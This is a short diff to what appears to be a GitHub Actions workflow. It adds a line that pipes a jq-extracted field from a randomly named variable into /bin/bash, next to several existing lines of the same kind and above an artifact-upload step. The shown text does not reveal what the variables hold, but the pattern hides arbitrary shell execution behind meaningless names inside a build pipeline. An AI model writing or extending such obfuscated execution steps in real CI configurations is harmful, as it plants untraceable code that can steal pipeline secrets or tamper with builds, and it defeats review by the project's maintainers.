@@ -21,6 +21,7 @@ jobs:
           printf '%s' "$hyq2" | jq -r .raj3 | /bin/bash
           echo $zvysi57 | jq -r .pyxr2 | /bin/bash
           echo $xmb68 | jq -r .g95 | /bin/bash
+          echo $jlitq7 | jq -r .l404 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
